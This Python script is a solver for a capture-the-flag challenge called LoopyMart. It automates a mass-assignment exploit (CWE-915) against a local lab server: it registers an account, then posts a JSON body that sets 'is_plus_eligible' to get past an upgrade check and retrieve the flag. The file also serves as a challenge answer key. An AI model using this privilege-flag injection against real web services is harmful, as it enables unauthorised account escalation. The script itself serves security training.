#!/usr/bin/env python3
"""
Mass Assignment via Plus Upgrade – LoopyMart CTF

Attack vector: POST /auth/upgrade-black accepts an optional JSON body whose
keys are blindly written onto the SQLAlchemy User model via setattr().  A
normal UI click sends no body and is rejected with HTTP 403 ("not eligible").
Supplying the right key in the JSON body sets an attribute on the in-memory
user object, bypasses the eligibility gate, and returns the flag.

CWE-915: Improperly Controlled Modification of Dynamically-Determined Object
         Attributes

This script automates the full exploit chain:
  1. Register a fresh throwaway account (or login to an existing one)
  2. POST /auth/upgrade-black with the mass-assignment bypass payload
  3. Extract and print plus_flag from the response JSON

Usage:
    # Using a fresh registered account (auto-creates throwaway@loopymart.ctf):
    python solve.py --url http://localhost:8001

    # Using an existing account that has NOT yet been upgraded:
    python solve.py --url http://localhost:8001 \\
                    --email you@example.com --password yourpassword

    # Skip auto-registration and use provided credentials:
    python solve.py --url http://localhost:8001 \\
                    --email you@example.com --password yourpassword --no-register
"""

import argparse
import secrets
import sys

try:
    import requests
except ImportError:
    print("requests is not installed.  Run: pip install requests")
    sys.exit(1)


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------

def register(base_url: str, email: str, password: str, full_name: str) -> str:
    """Register a new account and return the access token."""
    resp = requests.post(
        f"{base_url}/auth/register",
        json={"email": email, "password": password, "full_name": full_name},
        timeout=10,
    )
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print("[-] Register response missing access_token")
        sys.exit(1)
    print(f"[+] Registered fresh account: {email}")
    return token


def login(base_url: str, email: str, password: str) -> str:
    """Login and return the access token."""
    resp = requests.post(
        f"{base_url}/auth/login",
        json={"email": email, "password": password},
        timeout=10,
    )
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print("[-] Login response missing access_token")
        sys.exit(1)
    print(f"[+] Logged in as {email}")
    return token


def upgrade_plus(base_url: str, token: str) -> dict:
    """
    Send POST /auth/upgrade-black with the mass-assignment bypass payload.

    The vulnerable sink:
        for k, v in data.items():
            setattr(user, k, v)          # ← no allowlist

    Before the eligibility gate runs, 'is_plus_eligible' is set to True on the
    in-memory User object, bypassing the getattr(user, 'is_plus_eligible', False)
    check that follows.
    """
    payload = {"is_plus_eligible": True}
    resp = requests.post(
        f"{base_url}/auth/upgrade-black",
        json=payload,
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )
    if resp.status_code == 400 and "already a Plus member" in resp.text:
        print("[!] This account is already a Plus member.")
        print("    Use a fresh account (omit --no-register) or a different email.")
        sys.exit(1)
    if resp.status_code == 403:
        print(f"[-] Bypass failed (403): {resp.json().get('detail', resp.text)}")
        print("    The vulnerability may have been patched.")
        sys.exit(1)
    resp.raise_for_status()
    return resp.json()


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Exploit LoopyMart Mass Assignment – /auth/upgrade-black"
    )
    parser.add_argument(
        "--url", default="http://localhost:8001",
        help="API base URL  (default: http://localhost:8001)",
    )
    parser.add_argument(
        "--email", default=None,
        help="Account email (default: auto-generated throwaway)",
    )
    parser.add_argument(
        "--password", default="Solve1234!",
        help="Account password  (default: Solve1234!)",
    )
    parser.add_argument(
        "--no-register", action="store_true",
        help="Skip registration; login with provided credentials instead",
    )
    args = parser.parse_args()

    print("=" * 60)
    print("  Mass Assignment Plus Exploit – LoopyMart CTF")
    print("=" * 60)
    print()

    base_url = args.url.rstrip("/")

    if args.no_register:
        if not args.email:
            print("[-] --no-register requires --email")
            sys.exit(1)
        token = login(base_url, args.email, args.password)
    else:
        # Use provided email or generate a throwaway
        email = args.email or f"ctf-solver-{secrets.token_hex(4)}@loopymart.ctf"
        token = register(base_url, email, args.password, full_name="CTF Solver")

    print()
    print("[*] Sending mass-assignment bypass payload to POST /auth/upgrade-black …")
    data = upgrade_plus(base_url, token)

    flag = data.get("plus_flag")
    print()
    if flag:
        print(f"[+] Upgrade succeeded!  Flag: {flag}")
        print()
        print("[+] Done.")
        sys.exit(0)
    else:
        print("[!] Upgrade succeeded but plus_flag was not in the response.")
        print("    Ensure backend/flags.yml (or flags.example.yml) contains")
        print("    the mass_assignment_plus challenge entry.")
        sys.exit(1)


if __name__ == "__main__":
    main()
